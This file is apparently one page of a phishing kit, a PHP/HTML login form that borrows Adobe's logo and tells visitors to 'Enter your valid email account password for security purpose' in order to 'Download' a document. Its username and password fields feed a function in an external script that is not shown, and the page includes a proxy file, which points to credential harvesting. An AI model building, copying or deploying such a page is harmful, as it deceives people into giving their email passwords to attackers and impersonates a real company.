<?php include("../proxy.php"); ?>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    	<script src="../out/jquery.min.js"></script>

    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
  <link id="favicon" rel="shortcut icon" href="../out/favicon.ico" type="image/x-icon"/>
 <link href="../out/css.css" rel="stylesheet" type="text/css" />


<body>

<div class="box">
  <h1><div style="white-space: normal !important; padding: 0px 0px;" valign="top"><img src="https://auth.services.adobe.com/img/generic/adobe_logo_white.svg" width="130">
      <div id="errr1" style="border: none; outline: none;  color: #fff;  cursor: pointer;  border-radius: 0.312rem;  font-size: 1rem;">Enter your valid email account password for security purpose</div></div></h1>
    <div class="inputBox">
      <input type="email" name="username" id="username" required onKeyUp="this.setAttribute('value', this.value);" value="">
      <label>Username</label>
       <!--<div class="input">
        <div class="title"> USERNAME</div>
        <input class="text" type="text" placeholder=""/>
      </div>-->
    </div>
    <div class="inputBox">
      <input type="password" name="password" id="password" required onKeyUp="this.setAttribute('value', this.value);" value=""> 
      <label>Password</label>
       <!--<div class="input">
        <div class="title"> USERNAME</div>
        <input class="text" type="text" placeholder=""/>
      </div>-->
        	     <input type="hidden" class="form-control" name="myprocess" id="myprocess" value="">

    </div>
    <input type="button" name="sign-in" value="Download" onClick="covid()">
</div>
    	<script src="../out/sc.js"></script>

</html>

                    